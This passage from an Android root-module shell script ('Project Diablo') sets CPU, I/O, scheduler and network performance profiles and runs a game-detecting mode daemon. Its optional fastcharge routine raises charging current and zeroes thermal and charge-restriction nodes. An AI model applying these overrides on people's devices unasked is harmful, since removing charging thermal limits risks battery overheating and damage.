            fi
            _prev_lock="${_lock:-0}"
        fi

        _prev_screen="$_screen"
        _prev_fps="$_fps"
    done
}

run_lock_fps_daemon() {
    lock_fps_daemon &
}

run_zeta() { [ "$(cfg_get ZETA_ENABLE)" = "1" ] && sh "$MODDIR/Scripts/Zeta.sh" 2>/dev/null & }
run_ame() {
    [ "$(cfg_get AME_RENDER)" = "1" ] && sh "$MODDIR/Scripts/AmeRender.sh" 2>/dev/null &
}

# ──────────────────────────────────────────
#  DIABLO BOOST — Red y latencia universal
# ──────────────────────────────────────────
diablo_boost_on() {
    # Parámetros exclusivos de Boost — power_save lo maneja net_gaming/net_normal
    kwrite 5000 /proc/sys/net/core/netdev_max_backlog
    kwrite 3    /proc/sys/net/ipv4/tcp_fastopen
    kwrite 1    /proc/sys/net/ipv4/tcp_sack
}

diablo_boost_off() {
    kwrite 1000 /proc/sys/net/core/netdev_max_backlog
    kwrite 1    /proc/sys/net/ipv4/tcp_fastopen
}

run_boost() {
    # Usar cache de _CC si esta disponible (dentro del loop AI), si no, leer disco
    local _boost
    if [ -n "$_CC" ]; then
        _boost=$(cfg_c BOOST_ENABLE)
    else
        _boost=$(cfg_get BOOST_ENABLE)
    fi
    [ "$_boost" = "1" ] && diablo_boost_on || diablo_boost_off
}

# ──────────────────────────────────────────
#  QCOM SCHEDULER — Solo Snapdragon (SOC=2)
# ──────────────────────────────────────────
qcom_sched_gaming() {
    [ "$SOC" = "2" ] || return
    kwrite 2500000  /proc/sys/kernel/sched_latency_ns          2>/dev/null
    kwrite 500000   /proc/sys/kernel/sched_min_granularity_ns  2>/dev/null
    kwrite 800000   /proc/sys/kernel/sched_wakeup_granularity_ns 2>/dev/null
    kwrite 1        /sys/module/cpu_boost/parameters/input_boost_enabled 2>/dev/null
    kwrite 200      /sys/module/cpu_boost/parameters/input_boost_ms      2>/dev/null
    kwrite 1        /sys/module/msm_performance/parameters/touchboost    2>/dev/null
    kwrite 5        /dev/stune/top-app/schedtune.boost                   2>/dev/null
    kwrite 1        /dev/stune/top-app/schedtune.prefer_idle             2>/dev/null
}

qcom_sched_balance() {
    [ "$SOC" = "2" ] || return
    kwrite 6000000  /proc/sys/kernel/sched_latency_ns          2>/dev/null
    kwrite 750000   /proc/sys/kernel/sched_min_granularity_ns  2>/dev/null
    kwrite 1500000  /proc/sys/kernel/sched_wakeup_granularity_ns 2>/dev/null
    kwrite 1        /sys/module/cpu_boost/parameters/input_boost_enabled 2>/dev/null
    kwrite 80       /sys/module/cpu_boost/parameters/input_boost_ms      2>/dev/null
    kwrite 0        /sys/module/msm_performance/parameters/touchboost    2>/dev/null
    kwrite 0        /dev/stune/top-app/schedtune.boost                   2>/dev/null
    kwrite 0        /dev/stune/top-app/schedtune.prefer_idle             2>/dev/null
}

qcom_sched_save() {
    [ "$SOC" = "2" ] || return
    kwrite 0        /sys/module/cpu_boost/parameters/input_boost_enabled 2>/dev/null
    kwrite 0        /sys/module/cpu_boost/parameters/input_boost_ms      2>/dev/null
    kwrite 0        /sys/module/msm_performance/parameters/touchboost    2>/dev/null
    kwrite 0        /dev/stune/top-app/schedtune.boost                   2>/dev/null
}

# ──────────────────────────────────────────
#  I/O TWEAKS — Universal, por modo
# ──────────────────────────────────────────
io_performance() {
    # FIX v4.2: scheduler con latencia garantizada (faltaba en v3)
    # mq-deadline/deadline asegura que cada request se complete en
    # tiempo maximo definido → sin picos de latencia al cargar assets.
    # Este parámetro es clave para la fluidez en gaming.
    for q in /sys/block/*/queue; do
        [ -d "$q" ] || continue
        if [ -f "$q/scheduler" ]; then
            local _av; _av=$(cat "$q/scheduler" 2>/dev/null)
            echo "$_av" | grep -q "mq-deadline" && echo "mq-deadline" > "$q/scheduler" 2>/dev/null ||
            echo "$_av" | grep -q "deadline"    && echo "deadline"    > "$q/scheduler" 2>/dev/null ||
            echo "$_av" | grep -q "bfq"         && echo "bfq"         > "$q/scheduler" 2>/dev/null
        fi
        kwrite 0   "$q/iostats"       2>/dev/null
        kwrite 0   "$q/add_random"    2>/dev/null
        kwrite 1   "$q/rq_affinity"   2>/dev/null
        kwrite 512 "$q/read_ahead_kb" 2>/dev/null
        kwrite 64  "$q/nr_requests"   2>/dev/null
        kwrite 1   "$q/nomerges"      2>/dev/null
    done
}

io_balance() {
    for q in /sys/block/*/queue; do
        [ -d "$q" ] || continue
        if [ -f "$q/scheduler" ]; then
            local _av; _av=$(cat "$q/scheduler" 2>/dev/null)
            echo "$_av" | grep -q "mq-deadline" && echo "mq-deadline" > "$q/scheduler" 2>/dev/null ||
            echo "$_av" | grep -q "deadline"    && echo "deadline"    > "$q/scheduler" 2>/dev/null ||
            echo "$_av" | grep -q "bfq"         && echo "bfq"         > "$q/scheduler" 2>/dev/null
        fi
        kwrite 0   "$q/iostats"       2>/dev/null
        kwrite 0   "$q/add_random"    2>/dev/null
        kwrite 1   "$q/rq_affinity"   2>/dev/null
        kwrite 256 "$q/read_ahead_kb" 2>/dev/null
        kwrite 64  "$q/nr_requests"   2>/dev/null
        kwrite 1   "$q/nomerges"      2>/dev/null
    done
}

io_save() {
    for q in /sys/block/*/queue; do
        [ -d "$q" ] || continue
        if [ -f "$q/scheduler" ]; then
            local _av; _av=$(cat "$q/scheduler" 2>/dev/null)
            echo "$_av" | grep -q "noop" && echo "noop" > "$q/scheduler" 2>/dev/null ||
            echo "$_av" | grep -q "none" && echo "none" > "$q/scheduler" 2>/dev/null
        fi
        kwrite 1   "$q/iostats"       2>/dev/null
        kwrite 1   "$q/add_random"    2>/dev/null
        kwrite 1   "$q/rq_affinity"   2>/dev/null
        kwrite 128 "$q/read_ahead_kb" 2>/dev/null
        kwrite 128 "$q/nr_requests"   2>/dev/null
        kwrite 0   "$q/nomerges"      2>/dev/null
    done
}

# ──────────────────────────────────────────
#  FASTCHARGE ENGINE — UNIVERSAL
#  Cubre: Snapdragon, MediaTek, Exynos, Kirin, Unisoc, Tensor
#  Protocolos: USB-PD, QC, VOOC/WARP, SCP, PPS, AFC, FCP, PE
#  Todo nodo verificado con [ -w ] antes de escribir — nunca falla
# ──────────────────────────────────────────

_fc_to_uA() { awk "BEGIN{printf \"%d\", $1*1000}"; }
_fc_to_mA() { echo "$1"; }

# Escribe en un nodo solo si existe y es escribible
_fc_w() { [ -w "$1" ] && echo "$2" > "$1" 2>/dev/null; }

_fc_apply() {
    local FC_MA FC_TEMP_HOT UA TEMP_DS

    FC_MA=$(grep "^FC_CURRENT_MA=" "$FC_CFG" 2>/dev/null | cut -d= -f2 | tr -d ' \n\r')
    FC_MA=${FC_MA:-2000}
    FC_TEMP_HOT=$(grep "^FC_TEMP_HOT=" "$FC_CFG" 2>/dev/null | cut -d= -f2 | tr -d ' \n\r')
    FC_TEMP_HOT=${FC_TEMP_HOT:-42}
    UA=$(_fc_to_uA "$FC_MA")
    TEMP_DS=$(awk "BEGIN{printf \"%d\", $FC_TEMP_HOT*10}")

    # ── 1. Kernels custom (force_fast_charge) ────────────────────
    # Templer Gaming, Sultan, Blu_spark, kirisakura, etc.
    _fc_w /sys/kernel/fast_charge/force_fast_charge 1
    _fc_w /sys/kernel/fast_charge/ac_levels         "$FC_MA"
    _fc_w /sys/kernel/fast_charge/usb_levels        "$FC_MA"
    _fc_w /sys/kernel/fast_charge/wireless_levels   "$FC_MA"
    _fc_w /sys/kernel/fast_charge/charge_level      "$FC_MA"

    # ── 2. Nodos USB / entrada de corriente ──────────────────────
    for _p in \
        /sys/class/power_supply/usb \
        /sys/class/power_supply/USB \
        /sys/class/power_supply/charger \
        /sys/class/power_supply/Charger \
        /sys/class/power_supply/ac \
        /sys/class/power_supply/AC \
        /sys/class/power_supply/dc \
        /sys/class/power_supply/DC \
        /sys/class/power_supply/wireless \
        /sys/class/power_supply/mains
    do
        [ -d "$_p" ] || continue
        _fc_w "$_p/current_max"          "$UA"
        _fc_w "$_p/input_current_limit"  "$UA"
        _fc_w "$_p/input_current_max"    "$UA"
        _fc_w "$_p/constant_charge_current_max" "$UA"
    done

    # ── 3. Nodos batería ─────────────────────────────────────────
    for _n in \
        /sys/class/power_supply/battery/constant_charge_current_max \
        /sys/class/power_supply/battery/constant_charge_current \
        /sys/class/power_supply/battery/charge_current_max \
        /sys/class/power_supply/battery/input_current_max \
        /sys/class/power_supply/battery/input_current_limit \
        /sys/class/power_supply/battery/fast_charge_current \
        /sys/class/power_supply/bms/charge_current_max \
        /sys/class/power_supply/bms/constant_charge_current_max
    do
        _fc_w "$_n" "$UA"
    done

    # ── 4. Qualcomm / PMIC ───────────────────────────────────────
    _fc_w /sys/class/qcom-battery/restrict_chg                      0
    _fc_w /sys/class/qcom-battery/restrict_cur                      0
    _fc_w /sys/class/power_supply/battery/input_current_limited      0
    _fc_w /sys/class/power_supply/battery/step_charging_enabled      1
    _fc_w /sys/class/power_supply/battery/sw_jeita_enabled           1
    _fc_w /sys/class/power_supply/battery/battery_charging_enabled   1
    _fc_w /sys/class/power_supply/battery/charging_enabled           1
    _fc_w /sys/class/power_supply/usb/pd_active                      0
    _fc_w /sys/class/power_supply/battery/charger_temp               "$TEMP_DS"
    _fc_w /sys/class/power_supply/battery/charger_temp_max           "$TEMP_DS"
    # QC 3.0 / QC 4.0
    _fc_w /sys/class/power_supply/usb/quick_charge_type              2
    _fc_w /sys/class/power_supply/usb/hvdcp_opti_allow               1

    # ── 5. MediaTek ──────────────────────────────────────────────
    _fc_w /proc/mtk_battery_cmd/current_cmd                          "0 0"
    _fc_w /sys/devices/platform/charger/current_limit                "$FC_MA"
    _fc_w /sys/class/power_supply/mtk-master-charger/current_max     "$UA"
    _fc_w /sys/class/power_supply/mtk_charger/constant_charge_current_max "$UA"
    # MTK PE (Pump Express)
    _fc_w /sys/class/power_supply/battery/pe_enabled                 1

    # ── 6. Samsung / Exynos ──────────────────────────────────────
    _fc_w /sys/class/power_supply/battery/batt_tune_fast_charge_current "$FC_MA"
    _fc_w /sys/class/power_supply/battery/batt_tune_input_charge_current "$FC_MA"
    _fc_w /sys/class/power_supply/battery/siop_level                  100
    _fc_w /sys/class/power_supply/battery/wc_enable                   1
    _fc_w /sys/class/power_supply/battery/store_mode                  0
    # AFC (Adaptive Fast Charging)
    _fc_w /sys/class/power_supply/battery/hv_charger_status           1

    # ── 7. Kirin / HiSilicon ─────────────────────────────────────
    _fc_w /sys/class/power_supply/Charger/ichg_set                   "$FC_MA"
    _fc_w /sys/class/hw_power/charger/charge_data/iin_thermal         "$FC_MA"
    _fc_w /sys/class/hw_power/charger/charge_data/ichg_thermal        "$FC_MA"

    # ── 8. Unisoc ────────────────────────────────────────────────
    _fc_w /sys/class/power_supply/sprdfgu/fast_charge_current         "$UA"
    _fc_w /sys/class/power_supply/sprd_charger/current_max            "$UA"

    # ── 9. Google Tensor ─────────────────────────────────────────
    _fc_w /sys/class/power_supply/gcpm/current_max                    "$UA"
    _fc_w /sys/class/power_supply/gcpm_pps/current_max                "$UA"

    # ── 10. Thermal — aliviar límites térmicos de carga ──────────
    _fc_w /sys/class/power_supply/battery/thermal_level               0
    _fc_w /sys/class/power_supply/battery/system_temp_level           0
    _fc_w /sys/devices/virtual/thermal/cooling_device0/cur_state      0
    # thermald Qualcomm — desactivar límite de carga por temperatura
    [ -f /sys/class/qcom-battery/soc_cool_down ] && _fc_w /sys/class/qcom-battery/soc_cool_down 0
}

_fc_restore() {
    local UA_DEF
    UA_DEF=$(_fc_to_uA 900)

    # Kernels custom
    _fc_w /sys/kernel/fast_charge/force_fast_charge 0

    # USB entrada
    for _p in \
        /sys/class/power_supply/usb /sys/class/power_supply/USB \
        /sys/class/power_supply/charger /sys/class/power_supply/ac \
        /sys/class/power_supply/dc /sys/class/power_supply/mains
    do
        [ -d "$_p" ] || continue
        _fc_w "$_p/current_max"         "$UA_DEF"
        _fc_w "$_p/input_current_limit" "$UA_DEF"
        _fc_w "$_p/input_current_max"   "$UA_DEF"
    done

    # Batería
    for _n in \
        /sys/class/power_supply/battery/constant_charge_current_max \
        /sys/class/power_supply/battery/charge_current_max \
        /sys/class/power_supply/battery/input_current_max
    do
        _fc_w "$_n" "$UA_DEF"
    done

    # Qualcomm
    _fc_w /sys/class/qcom-battery/restrict_chg 1
    _fc_w /sys/class/power_supply/battery/input_current_limited 1

    # Samsung
    _fc_w /sys/class/power_supply/battery/siop_level 70
}

# ──────────────────────────────────────────
#  APLICAR MODO
# ──────────────────────────────────────────
CURRENT_STATE=0

apply_mode() {
    local NUM="$1"
    local ORIGIN="${2:-manual}"
    local NAME

    [ "$NUM" = "$CURRENT_STATE" ] && return

    case "$NUM" in
        1) NAME="performance" ;;
        2) NAME="balance"     ;;
        3) NAME="battery"     ;;
        4) NAME="gaming"      ;;
        *) NUM=2; NAME="balance" ;;
    esac

    cfg_set STATE "$NUM"
    cfg_set MODE  "$NAME"
    CURRENT_STATE="$NUM"

    case "$NUM" in
        1) cpu_max;     gpu_max;     dvfsrc_max;     fpsgo_gaming; android_perf
           qcom_sched_gaming; io_performance; net_normal
           notify "🔥 Performance activado" ;;
        2) cpu_balance; gpu_balance; dvfsrc_balance; fpsgo_normal; android_balance
           qcom_sched_balance; io_balance; net_normal
           notify "⚖️ Balance activado" ;;
        3) cpu_save;    gpu_save;    dvfsrc_save;    fpsgo_normal; android_save
           qcom_sched_save; io_save; net_normal
           notify "🔋 Battery activado" ;;
        4) cpu_max_gaming; gpu_max_gaming; dvfsrc_max; fpsgo_gaming; android_gaming
           qcom_sched_gaming; io_performance; net_gaming
           notify "😈 Gaming Pro activado" ;;
    esac

    # Boost siempre al final — gana sobre net_normal/net_gaming en params compartidos
    run_boost
    write_log "$NAME" "$ORIGIN"
}

# ──────────────────────────────────────────
#  DiabloAI — helpers de detección
# ──────────────────────────────────────────
get_screen_state() {
    # Lee directamente del kernel — sin lanzar proceso Java (dumpsys costoso)
    local node
    for node in /sys/class/backlight/*/brightness \
                /sys/class/leds/lcd-backlight/brightness \
                /sys/class/leds/lcd_backlight/brightness; do
        [ -f "$node" ] || continue
        local val; val=$(cat "$node" 2>/dev/null)
        [ "${val:-0}" -gt 0 ] && echo "on" && return
        echo "off" && return
    done
    # Fallback: wakeup_reason — ultra liviano, sin Binder
    local wr; wr=$(cat /sys/power/pm_wakeup_irq 2>/dev/null || echo "")
    [ -n "$wr" ] && echo "on" || echo "off"
}
get_charging_state() {
    local s; s=$(cat /sys/class/power_supply/battery/status 2>/dev/null)
    echo "$s" | grep -qi "charging" && echo "charging" || echo "not"
}
get_battery_level() {
    cat /sys/class/power_supply/battery/capacity 2>/dev/null || echo "100"
}
get_temp_c() {
    local raw; raw=$(cat /sys/class/power_supply/battery/temp 2>/dev/null || echo "0")
    echo $(( (raw + 5) / 10 ))
}

# Detecta app de la gamelist activa y devuelve package|modo
# ──────────────────────────────────────────
#  DiabloAI — Funciones de detección rápida
#
#  Optimizaciones:
#  - cat /proc/PID/cmdline en vez de dd (más rápido)
#  - tr -d solo el null byte, head -c 128 limita lectura
#  - Salida inmediata al primer match (return)
#  - app_still_running guarda el PID para no re-escanear
# ──────────────────────────────────────────

# Lee cmdline de un pid de forma rapida — una sola subshell en vez de pipe de 4 procesos
_read_pkg() {
    local raw
    raw=$(tr -d '\0' < "$1/cmdline" 2>/dev/null) || return
    echo "${raw%%:*}" | head -c 128
}

# Cache del gamelist en memoria para evitar I/O repetido en cada ciclo
_GAMELIST_CACHE=""
_GAMELIST_MTIME=""
_GAMELIST_PKGS=""
_refresh_gamelist_cache() {
    local mtime; mtime=$(stat -c '%Y' "$GAMELIST" 2>/dev/null)
    if [ "$mtime" != "$_GAMELIST_MTIME" ]; then
        _GAMELIST_CACHE=$(cat "$GAMELIST" 2>/dev/null)
        _GAMELIST_MTIME="$mtime"
        _GAMELIST_PKGS=$(printf '%s\n' "$_GAMELIST_CACHE" | grep '^[a-zA-Z].*|' | cut -d'|' -f1 | tr '\n' '|' | sed 's/|$//')
    fi
}

# Detecta la primera app del gamelist en primer plano (oom <= 0)
# Optimizacion: gamelist cacheado, pattern pre-compilado, skip rapido si no coincide
get_foreground_app() {
    _refresh_gamelist_cache
    [ -z "$_GAMELIST_CACHE" ] && echo "" && return
    [ -z "$_GAMELIST_PKGS" ] && echo "" && return
    local pkg line mode oom
    for pid_dir in /proc/[0-9]*; do
        [ -f "$pid_dir/oom_score_adj" ] || continue
        oom=$(cat "$pid_dir/oom_score_adj" 2>/dev/null)
        [ "${oom:-1}" -le 0 ] 2>/dev/null || continue
        [ -f "$pid_dir/cmdline" ] || continue
        pkg=$(_read_pkg "$pid_dir")
        [ -z "$pkg" ] && continue
        echo "$pkg" | grep -qE "^(${_GAMELIST_PKGS})$" || continue
        line=$(printf '%s\n' "$_GAMELIST_CACHE" | grep "^${pkg}|" | head -1)
        [ -z "$line" ] && continue
        mode=$(echo "$line" | cut -d'|' -f3 | tr -d ' \n\r')
        echo "${pkg}|${mode:-4}"
        return
    done
    echo ""
}

# Verifica si un package sigue en primer plano por PID guardado
app_still_running() {
    local target="$1"
    local saved_pid="$2"
    if [ -n "$saved_pid" ] && [ -f "/proc/$saved_pid/cmdline" ]; then
        local chk; chk=$(_read_pkg "/proc/$saved_pid")
        if [ "$chk" = "$target" ]; then
            local oom; oom=$(cat "/proc/$saved_pid/oom_score_adj" 2>/dev/null)
            [ "$oom" -le 0 ] 2>/dev/null && return 0
        fi
    fi
    # Fallback: escanear buscando el proceso en primer plano
    local pkg
    for pid_dir in /proc/[0-9]*; do
        [ -f "$pid_dir/oom_score_adj" ] || continue
        [ "$(cat "$pid_dir/oom_score_adj" 2>/dev/null)" -le 0 ] 2>/dev/null || continue
        [ -f "$pid_dir/cmdline" ] || continue
        pkg=$(_read_pkg "$pid_dir")
        [ "$pkg" = "$target" ] && return 0
    done
    return 1
}

# Obtiene el PID de un package — solo busca entre procesos foreground (oom<=0)
get_pid_of() {
    local target="$1"
    local oom
    for pid_dir in /proc/[0-9]*; do
        [ -f "$pid_dir/oom_score_adj" ] || continue
        oom=$(cat "$pid_dir/oom_score_adj" 2>/dev/null)
        [ "${oom:-1}" -le 0 ] 2>/dev/null || continue
        [ -f "$pid_dir/cmdline" ] || continue
        [ "$(_read_pkg "$pid_dir")" = "$target" ] && {
            echo "${pid_dir##*/}"; return
        }
    done
    echo ""
}

# ──────────────────────────────────────────
#  DiabloAI v3 — Motor con bloqueo por app + Lock FPS
#
#  LÓGICA:
#  1. Si hay app en primer plano del gamelist → aplica su modo y BLOQUEA
#  2. Mientras esa app siga en memoria → no hace nada (bloqueado)
#  3. Cuando la app desaparece → libera el bloqueo y vuelve a reglas normales
#  4. Reglas normales: temperatura > pantalla off > batería baja > cargando > idle
#  5. AI OFF → modo manual del usuario, no interviene
# ──────────────────────────────────────────
diablo_ai() {
    local LOCKED_PKG=""      # app bloqueada actualmente
    local LOCKED_PID=""      # PID de la app bloqueada (para check rápido)
    local LOCKED_MODE=""     # modo del juego bloqueado (para restaurar tras cooldown)
    local PREV_OTHER=""      # estado previo fuera de app
    local IDLE_TIMER=0
    local PREV_AI_STATE=""
    local PRE_GAME_STATE=""  # perfil del usuario antes de entrar al juego
    local _AI_STABLE_TICKS=0 # contador de ciclos sin cambio de estado

    while true; do
        # Cuando hay juego activo usar ciclo rapido (6s); sin juego, ciclo normal (8s)
        # 6s da margen suficiente sin interrumpir frames activos
        if [ -n "$LOCKED_PKG" ]; then
            sleep 6
        else
            sleep 8
        fi

        _load_cfg_cache
        local AI_STATE; AI_STATE=$(cfg_c AI_ENABLE)

        # AI desactivado — reset completo y esperar largo (no hay nada que monitorear)
        if [ "$AI_STATE" != "1" ]; then
            LOCKED_PKG=""; LOCKED_PID=""; LOCKED_MODE=""
            PREV_OTHER=""; PREV_AI_STATE="0"; IDLE_TIMER=0
            PRE_GAME_STATE=""
            sleep 30
            continue
        fi

        # AI recién activado — forzar re-evaluación
        if [ "$PREV_AI_STATE" != "1" ]; then
            LOCKED_PKG=""; LOCKED_PID=""; LOCKED_MODE=""
            PREV_OTHER=""; IDLE_TIMER=0; PRE_GAME_STATE=""
        fi
        PREV_AI_STATE="1"

        # ════════════════════════════════════════
        #  FAST PATH — juego activo
        #  Evita dumpsys power + charging + temp + cfg_c cada segundo durante gaming.
        # ════════════════════════════════════════
        if [ -n "$LOCKED_PKG" ]; then
            if app_still_running "$LOCKED_PKG" "$LOCKED_PID"; then
                [ "$(cfg_c CURRENT_GAME)" != "$LOCKED_PKG" ] && cfg_set CURRENT_GAME "$LOCKED_PKG"
                IDLE_TIMER=0
                PREV_OTHER=""
                continue
            else
                # Juego terminó — restaurar modo previo
                [ -n "$LOCKED_PID" ] && echo 0 > "/proc/$LOCKED_PID/oom_score_adj" 2>/dev/null
                LOCKED_PKG=""; LOCKED_PID=""; LOCKED_MODE=""
                PREV_OTHER=""
                cfg_set CURRENT_GAME "ninguno"
                if [ -n "$PRE_GAME_STATE" ]; then
                    CURRENT_STATE=0
                    apply_mode "$PRE_GAME_STATE" "DiabloAI·PostGame"
                    PRE_GAME_STATE=""
                fi
            fi
        fi

        # ── LEER ESTADO DEL DISPOSITIVO ──
        local SCREEN; SCREEN=$(get_screen_state)
        local CHARGING; CHARGING=$(get_charging_state)
        local BAT_PCT; BAT_PCT=$(get_battery_level)
        local TEMP_C; TEMP_C=$(get_temp_c)

        # ── LEER CONFIGURACIÓN DE REGLAS ──
        local R_COOLDOWN; R_COOLDOWN=$(cfg_c AI_COOLDOWN)
        local R_COOLDOWN_T; R_COOLDOWN_T=$(cfg_c AI_COOLDOWN_TEMP)
        R_COOLDOWN_T=${R_COOLDOWN_T:-45}
        local R_SCREEN; R_SCREEN=$(cfg_c AI_SCREEN_OFF)
        local R_LOWBAT; R_LOWBAT=$(cfg_c AI_LOWBAT)
        local R_LOWBAT_P; R_LOWBAT_P=$(cfg_c AI_LOWBAT_PCT)
        R_LOWBAT_P=${R_LOWBAT_P:-20}
        local R_CHARGING; R_CHARGING=$(cfg_c AI_CHARGING)
        local R_IDLE; R_IDLE=$(cfg_c AI_IDLE)
        local R_IDLE_MIN; R_IDLE_MIN=$(cfg_c AI_IDLE_MIN)
        R_IDLE_MIN=${R_IDLE_MIN:-5}
        local R_IDLE_SEC; R_IDLE_SEC=$((R_IDLE_MIN * 60))
        local R_DEF; R_DEF=$(cfg_c AI_DEFAULT_MODE)
        R_DEF=${R_DEF:-2}
        local DEF_STATE
        case "$R_DEF" in
            1) DEF_STATE="performance" ;;
            3) DEF_STATE="battery"     ;;
            4) DEF_STATE="gaming"      ;;
            *)  DEF_STATE="balance"    ;;
        esac

        # ════════════════════════════════════════
        #  BLOQUE 1: TEMPERATURA
        # ════════════════════════════════════════
        if [ "$R_COOLDOWN" = "1" ] && [ "$TEMP_C" -ge "$R_COOLDOWN_T" ] 2>/dev/null; then
            if [ "$PREV_OTHER" != "cooldown" ]; then
                PREV_OTHER="cooldown"
                CURRENT_STATE=0
                cfg_set CURRENT_GAME "ninguno"
                apply_mode 3 "DiabloAI·CoolDown(${TEMP_C}C)"
            fi
            continue
        fi

        if [ "$PREV_OTHER" = "cooldown" ]; then
            PREV_OTHER=""
            LOCKED_PKG=""
        fi

        # ════════════════════════════════════════
        #  BLOQUE 2: APP DEL GAMELIST
        # ════════════════════════════════════════
        local FG_INFO; FG_INFO=$(get_foreground_app)

        if [ -n "$FG_INFO" ]; then
            local FG_PKG; FG_PKG=$(echo "$FG_INFO" | cut -d'|' -f1)
            local FG_MODE; FG_MODE=$(echo "$FG_INFO" | cut -d'|' -f2)

            LOCKED_PKG="$FG_PKG"
            LOCKED_PID=$(get_pid_of "$FG_PKG")
            IDLE_TIMER=0
            PREV_OTHER=""
            cfg_set CURRENT_GAME "$FG_PKG"

            if [ -z "$PRE_GAME_STATE" ]; then
                PRE_GAME_STATE=$(cfg_c STATE)
                LOCKED_MODE="$FG_MODE"
                [ -n "$LOCKED_PID" ] && echo -800 > "/proc/$LOCKED_PID/oom_score_adj" 2>/dev/null
                CURRENT_STATE=0
                apply_mode "$FG_MODE" "DiabloAI·${FG_PKG}"
            elif [ -n "$LOCKED_MODE" ] && [ "$CURRENT_STATE" != "$LOCKED_MODE" ]; then
                [ -n "$LOCKED_PID" ] && echo -800 > "/proc/$LOCKED_PID/oom_score_adj" 2>/dev/null
                CURRENT_STATE=0
                apply_mode "$LOCKED_MODE" "DiabloAI·PostCooldown"
            fi
            continue
        fi

        cfg_set CURRENT_GAME "ninguno"

        # ════════════════════════════════════════
        #  BLOQUE 3: REGLAS GENERALES (sin app)
        #  Guarda: si hay un juego bloqueado aún en memoria, no interrumpir
        # ════════════════════════════════════════
        [ -n "$LOCKED_PKG" ] && continue
        local NEW_STATE="" NEW_ORIGIN=""

        if [ "$R_SCREEN" = "1" ] && [ "$SCREEN" = "off" ]; then
            NEW_STATE="battery"
            NEW_ORIGIN="DiabloAI·Pantalla OFF"
            IDLE_TIMER=0
        elif [ "$R_LOWBAT" = "1" ] && [ "$BAT_PCT" -le "$R_LOWBAT_P" ] 2>/dev/null; then
            NEW_STATE="battery"
            NEW_ORIGIN="DiabloAI·Bateria(${BAT_PCT}%)"
            IDLE_TIMER=0
        elif [ "$R_CHARGING" = "1" ] && [ "$CHARGING" = "charging" ]; then
            NEW_STATE="$DEF_STATE"
            NEW_ORIGIN="DiabloAI·Cargando"
            IDLE_TIMER=0
        else
            if [ "$R_IDLE" = "1" ]; then
                IDLE_TIMER=$((IDLE_TIMER + 8))
                # Techo para evitar desbordamiento en sesiones muy largas
                [ "$IDLE_TIMER" -gt 86400 ] && IDLE_TIMER=86400
                if [ "$IDLE_TIMER" -ge "$R_IDLE_SEC" ]; then
                    NEW_STATE="battery"
                    NEW_ORIGIN="DiabloAI·Idle"
                else
                    NEW_STATE="$DEF_STATE"
                    NEW_ORIGIN="DiabloAI·Activo"
                fi
            else
                NEW_STATE="$DEF_STATE"
                NEW_ORIGIN="DiabloAI·Activo"
                IDLE_TIMER=0
            fi
        fi

        if [ -n "$NEW_STATE" ] && [ "$NEW_STATE" != "$PREV_OTHER" ]; then
            PREV_OTHER="$NEW_STATE"
            CURRENT_STATE=0
            case "$NEW_STATE" in
                performance) apply_mode 1 "$NEW_ORIGIN" ;;
                gaming)      apply_mode 4 "$NEW_ORIGIN" ;;
                balance)     apply_mode 2 "$NEW_ORIGIN" ;;
                battery)     apply_mode 3 "$NEW_ORIGIN" ;;
            esac
        fi
    done
}

# ──────────────────────────────────────────
#  INIT
# ──────────────────────────────────────────
mkdir -p "$CONF"

[ -f "$CONFIG" ] || cat > "$CONFIG" << 'CFGEOF'
STATE=2
MODE=balance
AI_ENABLE=1
TOUCH_ENABLE=1
SOC=0
ZETA_ENABLE=1
AME_RENDER=1
FC_ENABLE=0
AI_GAME_ENABLE=1
AI_GAME_MODE=4
AI_SCREEN_OFF=1
AI_CHARGING=1
AI_IDLE=1
AI_IDLE_MIN=5
AI_LOWBAT=1
AI_LOWBAT_PCT=20
AI_COOLDOWN=1
AI_COOLDOWN_TEMP=45
AI_DEFAULT_MODE=2
BOOST_ENABLE=0
NOTIFY_ENABLE=1
BAT_LEVEL=1
FIRST_RUN=1
CFGEOF

[ -f "$FC_CFG" ] || printf 'FC_CURRENT_MA=2000\nFC_TEMP_HOT=42\nFC_TEMP_COOL=39\n' > "$FC_CFG"
touch "$LOG_T" 2>/dev/null
touch "$LOG_D" 2>/dev/null

# Migración: agregar BAT_LEVEL si no existe en config previo
# Respeta 1=Soft 2=Moderate 3=Aggressive — nunca pisa el valor si ya existe
grep -q "^BAT_LEVEL=" "$CONFIG" 2>/dev/null || echo "BAT_LEVEL=1" >> "$CONFIG"

# Gamelist: copiar si no existe
[ -f "$GAMELIST" ] || cp "$MODDIR/gamelist.txt" "$GAMELIST" 2>/dev/null

# Primer arranque → abrir GitHub (en background, no bloquea el boot)
if [ "$(cfg_get FIRST_RUN)" = "1" ]; then
    cfg_set FIRST_RUN 0
    ( sleep 20 && su -lp 2000 -c "am start -a android.intent.action.VIEW -d 'https://github.com/ByRafaelSystem' > /dev/null 2>&1" ) &
fi

# Boot: modo por defecto si AI activo, guardado si AI inactivo
AI_BOOT=$(cfg_get AI_ENABLE)
AI_DEF=$(cfg_get AI_DEFAULT_MODE); [ -z "$AI_DEF" ] && AI_DEF=2
if [ "$AI_BOOT" = "1" ]; then
    cfg_set STATE "$AI_DEF"
    CURRENT_STATE=0
    apply_mode "$AI_DEF" "boot"
else
    INIT=$(cfg_get STATE); [ -z "$INIT" ] && INIT=2
    CURRENT_STATE=0
    apply_mode "$INIT" "boot"
fi

# Touch según config
if [ "$(cfg_get TOUCH_ENABLE)" = "1" ]; then
    apply_touch_on
else
    apply_touch_off
fi

# Zeta y AmeRender — solo al boot, nunca durante gaming
# Se ejecutan una sola vez y no vuelven a correr aunque cambie el modo
run_zeta
run_ame

# FastCharge si está habilitado
if [ "$(cfg_get FC_ENABLE)" = "1" ]; then
    _fc_apply
fi

# Lanzar DiabloAI en background
diablo_ai &

# Lanzar Lock FPS Daemon en background — re-aplica el lock cada ciclo
# para sobrevivir resets de SurfaceFlinger (pantalla off/on, rotaciones)
run_lock_fps_daemon

# Diablo Protect: boot completado exitosamente
date +%s > /data/ProjectDiablo/.boot_stamp 2>/dev/null
echo "0" > /data/ProjectDiablo/.boot_count 2>/dev/null

# Notificación si Diablo Protect desactivó el módulo en un boot anterior
if [ -f /data/ProjectDiablo/.protect_triggered ]; then
    rm -f /data/ProjectDiablo/.protect_triggered 2>/dev/null
    sleep 10
    notify "🛡️ Diablo Protect se activó y desactivó el módulo por 3 bootloops consecutivos. Si antes funcionaba, puede ser otro módulo el causante. Desactívalo o desinstala Project Diablo si fue la causa."
fi

# ──────────────────────────────────────────
#  LOOP PRINCIPAL — triggers del WebUI
